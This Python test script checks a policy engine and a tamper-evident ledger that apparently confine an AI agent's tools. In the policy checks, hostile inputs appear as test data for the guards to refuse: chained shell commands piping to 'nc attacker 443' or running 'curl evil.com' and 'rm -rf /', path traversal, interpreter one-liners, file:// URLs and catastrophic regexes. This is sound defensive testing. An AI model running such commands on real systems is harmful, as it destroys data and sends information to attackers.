"""Checks for the policy engine and the ledger.

Plain script, no test framework, so it runs anywhere Python does:
    python tests/test_core.py

Every check that covers a guard is written so that removing the guard fails it.
The point of this file is that the two claims the arena makes about itself,
that authority is enforced and that the record is tamper-evident, are checked
rather than asserted in a README.
"""

from __future__ import annotations

import json
import sys
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from crucible.ledger import Ledger  # noqa: E402
from crucible.policy import Policy, ToolRule, review_policy  # noqa: E402

PASSED = 0
FAILED: list[str] = []


def check(label: str, condition: bool, detail: str = "") -> None:
    global PASSED
    if condition:
        PASSED += 1
        print(f"  ok  {label}")
    else:
        FAILED.append(label)
        print(f"  FAIL  {label} {detail}")


def section(name: str) -> None:
    print(f"\n{name}")


# ------------------------------------------------------------------- policy

def policy_checks(tmp: Path) -> None:
    section("policy: scope")
    work = tmp / "work"
    (work / "src").mkdir(parents=True)
    (work / "src" / "app.py").write_text("x = 1", encoding="utf-8")
    # A sibling whose name starts with the scope's name. This is the directory
    # that a startswith-on-the-string containment check wrongly admits.
    lookalike = tmp / "work-evil"
    lookalike.mkdir()
    (lookalike / "secret.txt").write_text("stolen", encoding="utf-8")

    pol = review_policy(work)

    check("an unlisted tool is refused",
          not pol.check("send_email", {"path": str(work / "src" / "app.py")}))
    check("the refusal names the tool and the policy",
          "send_email" in pol.check("send_email", {}).reason
          and "review" in pol.check("send_email", {}).reason)

    check("a file inside the workspace reads",
          bool(pol.check("read_file", {"path": str(work / "src" / "app.py")})))

    escape = work / "src" / ".." / ".." / "work-evil" / "secret.txt"
    verdict = pol.check("read_file", {"path": str(escape)})
    check("a path that climbs out with .. is refused", not verdict)
    check("the traversal refusal reports the resolved path",
          "work-evil" in verdict.reason and ".." not in verdict.reason)

    check("a sibling directory sharing the scope's prefix is refused",
          not pol.check("read_file", {"path": str(lookalike / "secret.txt")}))

    elsewhere = tmp / "elsewhere" / "config" / "SAM"
    check("an absolute path elsewhere on disk is refused",
          not pol.check("read_file", {"path": str(elsewhere)}))

    check("a tool with no path scope refuses a path outright",
          not Policy("p", {"ping": ToolRule()}).check("ping", {"path": str(work)}))

    section("policy: an allowlisted binary is not an allowlisted behaviour")
    # Every one of these uses a permitted binary and contains no shell
    # metacharacter, so the metacharacter guard never sees them. Each was
    # reproduced end to end before the argument checks existed: reading a file
    # outside the workspace, writing past the size ceiling, editing the code
    # under review, and opening a socket.
    for payload in (
        'python -c "print(open(r\'C:\\Windows\\win.ini\').read())"',
        'python -c "import urllib.request"',
        "python --command \"import os\"",
        'node -e "require(\'fs\')"',
        'node --eval "1"',
        "node -r ./evil.js app.js",
        "python -i",
        "python",
    ):
        check(f"refused: {payload[:44]}",
              not pol.check("run_tests", {"command": payload}))
    check("the refusal explains why an interpreter flag is different",
          "execute" in pol.check(
              "run_tests", {"command": 'python -c "x"'}).reason)
    check("python -m is limited to test runners",
          not pol.check("run_tests", {"command": "python -m http.server"}))
    check("python -m with no module is refused",
          not pol.check("run_tests", {"command": "python -m"}))
    check("an interpreter pointed at a file outside the workspace is refused",
          not pol.check("run_tests",
                        {"command": f'python "{lookalike / "evil.py"}"'}))
    check("a runner pointed at a config outside the workspace is refused",
          not pol.check("run_tests",
                        {"command": f'pytest "{lookalike / "conftest.py"}"'}))

    section("policy: commands")
    check("a permitted binary runs",
          bool(pol.check("run_tests", {"command": "python -m pytest"})))
    check("python3 is permitted, because that is the binary's name on Linux",
          bool(pol.check("run_tests", {"command": "python3 -m pytest"})))
    check("running the workspace's own tests still works",
          bool(pol.check("run_tests",
                         {"command": "python -m unittest discover"})))
    check("a file inside the workspace can be run",
          bool(pol.check("run_tests",
                         {"command": f'python "{work / "src" / "app.py"}"'})))
    check("pytest with ordinary flags still works",
          bool(pol.check("run_tests", {"command": "pytest -q --tb=short"})))
    check("npm test still works",
          bool(pol.check("run_tests", {"command": "npm test"})))
    check("an absolute path to a permitted binary still runs",
          bool(pol.check("run_tests",
                         {"command": f'"{sys.executable}" -m pytest'})))
    check("case and extension do not smuggle a binary past the list",
          bool(pol.check("run_tests", {"command": "PYTHON.EXE -m pytest"})))
    check("an unlisted binary is refused",
          not pol.check("run_tests", {"command": "curl https://example.com"}))
    check("the command refusal names what was rejected",
          "curl" in pol.check("run_tests", {"command": "curl https://x.com"}).reason)

    for line in ("python -m pytest; curl evil.com",
                 "python -m pytest && rm -rf /",
                 "python -m pytest | nc attacker 443",
                 "python -c $(whoami)",
                 "python -m pytest > /etc/passwd"):
        check(f"a chained command is refused: {line.split(' ', 3)[-1][:22]}",
              not pol.check("run_tests", {"command": line}))

    check("a command list is checked the same as a string",
          not pol.check("run_tests", {"command": ["curl", "https://x.com"]}))

    section("policy: network and size")
    fetch = Policy("net", {"fetch": ToolRule(url_hosts=["github.com"])})
    check("a permitted host is allowed",
          bool(fetch.check("fetch", {"url": "https://github.com/a/b"})))
    check("a subdomain of a permitted host is allowed",
          bool(fetch.check("fetch", {"url": "https://api.github.com/repos"})))
    check("a lookalike host is refused",
          not fetch.check("fetch", {"url": "https://evilgithub.com/x"}))
    check("a permitted host used as a prefix of another is refused",
          not fetch.check("fetch", {"url": "https://github.com.evil.co/x"}))
    check("a non-http scheme is refused",
          not fetch.check("fetch", {"url": "file:///etc/passwd"}))
    check("the review policy reaches no network at all",
          not pol.check("read_file", {"url": "https://github.com"}))

    small = Policy("w", {"put": ToolRule(path_scopes=[work], max_bytes=10)})
    check("a write within the ceiling is allowed",
          bool(small.check("put", {"path": str(work / "a"), "content": "short"})))
    check("a write over the ceiling is refused",
          not small.check("put", {"path": str(work / "a"), "content": "x" * 11}))
    check("the size refusal quotes both numbers",
          "11" in small.check("put", {"path": str(work / "a"), "content": "x" * 11}).reason)

    section("search is bounded against a hostile pattern")
    import time as _time
    from crucible.ledger import Ledger as _Ledger
    from crucible.tools import Toolbox as _Toolbox

    box = _Toolbox(work, pol, _Ledger(tmp / "search.jsonl"))
    (work / "src" / "long.py").write_text("x = '" + "a" * 6000 + "'\n",
                                          encoding="utf-8")
    started = _time.monotonic()
    # The textbook exponential blow-up. A line-length cap does not save you
    # here: at any length worth allowing, (a+)+b still does not finish.
    result = box.invoke("search", {"path": str(work), "pattern": r"(a+)+b"})
    elapsed = _time.monotonic() - started
    check("a catastrophic pattern returns instead of hanging", elapsed < 5,
          f"took {elapsed:.1f}s")
    check("and it is refused with a reason rather than run",
          not result.ok and "exponential" in result.reason)
    for nasty in (r"(a*)*b", r"(\w+)+$", r"(x+x+)+y", r"(a+){3,}"):
        check(f"also refused: {nasty}",
              not box.invoke("search", {"path": str(work), "pattern": nasty}).ok)
    check("an ordinary quantifier is still allowed",
          box.invoke("search", {"path": str(work), "pattern": r"def \w+\("}).ok)
    check("an over-long pattern is rejected",
          not box.invoke("search", {"path": str(work), "pattern": "a" * 500}).ok)
    check("an invalid pattern is reported rather than raised",
          not box.invoke("search", {"path": str(work), "pattern": "((("}).ok)
    check("an ordinary search still finds what it should",
          "app.py" in box.invoke(
              "search", {"path": str(work), "pattern": r"x = 1"}).content)

    section("policy: failure is refusal")
    check("an argument that cannot be checked refuses rather than raises",
          not pol.check("read_file", {"path": "\x00bad"}))
    check("the policy renders as data for the run log",
          "read_file" in pol.as_dict()["tools"]
          and pol.as_dict()["tools"]["run_tests"]["commands"] == [
              "python", "python3", "pytest", "node", "npm"])


# ------------------------------------------------------------------- ledger

def ledger_checks(tmp: Path) -> None:
    section("ledger: chain")
    base = datetime(2026, 8, 16, 21, 0, tzinfo=timezone.utc)
    ticks = iter(base + timedelta(seconds=i) for i in range(500))
    path = tmp / "run.jsonl"
    led = Ledger(path, clock=lambda: next(ticks))

    led.append("run_started", task="find defects")
    led.append("tool_call", tool="read_file", path="src/app.py")
    denied = led.append("tool_denied", tool="fetch", reason="no network in policy")
    led.append("finding", title="off-by-one", verdict="confirmed")

    check("every entry is written", len(led.entries()) == 4)
    check("the chain verifies clean", led.verify() is None)
    check("the first entry follows the genesis hash",
          led.entries()[0]["prev"] == "0" * 64)
    check("each entry carries the hash of the one before it",
          led.entries()[2]["prev"] == led.entries()[1]["hash"])
    check("a refusal is recorded with its reason, not dropped",
          denied["payload"]["reason"] == "no network in policy")
    check("head is the tip of the chain", led.head == led.entries()[-1]["hash"])

    section("ledger: tampering shows")

    def rewrite(mutate) -> Ledger:
        rows = [json.loads(x) for x in path.read_text(encoding="utf-8").splitlines() if x.strip()]
        rows = mutate(rows)
        forged = tmp / "forged.jsonl"
        forged.write_text(
            "".join(json.dumps(r, sort_keys=True, separators=(",", ":")) + "\n" for r in rows),
            encoding="utf-8",
        )
        return Ledger(forged)

    def edited(rows):
        rows[3]["payload"]["verdict"] = "refuted"
        return rows

    brk = rewrite(edited).verify()
    check("an edited payload is caught", brk is not None and brk.seq == 3)
    check("the break says the contents disagree with the hash",
          brk is not None and "hash" in brk.reason)

    def dropped(rows):
        return rows[:2] + rows[3:]

    brk = rewrite(dropped).verify()
    check("an entry removed from the middle is caught", brk is not None)

    def truncated(rows):
        return rows[:2]

    check("a chain cut short still verifies, which is why the head is published",
          rewrite(truncated).verify() is None)

    def inserted(rows):
        forged = dict(rows[1])
        forged["payload"] = {"tool": "fetch", "note": "slipped in"}
        return rows[:2] + [forged] + rows[2:]

    brk = rewrite(inserted).verify()
    check("an entry slipped into the middle is caught", brk is not None)

    def reordered(rows):
        rows[1], rows[2] = rows[2], rows[1]
        return rows

    brk = rewrite(reordered).verify()
    check("entries swapped out of order are caught", brk is not None)

    section("ledger: resume")
    resumed = Ledger(path, clock=lambda: next(ticks))
    resumed.append("run_finished", findings=1)
    check("reopening continues one chain", resumed.verify() is None)
    check("the sequence carries on rather than restarting",
          resumed.entries()[-1]["seq"] == 4)


def main() -> None:
    with tempfile.TemporaryDirectory() as raw:
        tmp = Path(raw)
        policy_checks(tmp)
        ledger_checks(tmp)
    print(f"\n{PASSED} checks passed, {len(FAILED)} failed")
    if FAILED:
        for name in FAILED:
            print(f"  - {name}")
        sys.exit(1)


if __name__ == "__main__":
    main()
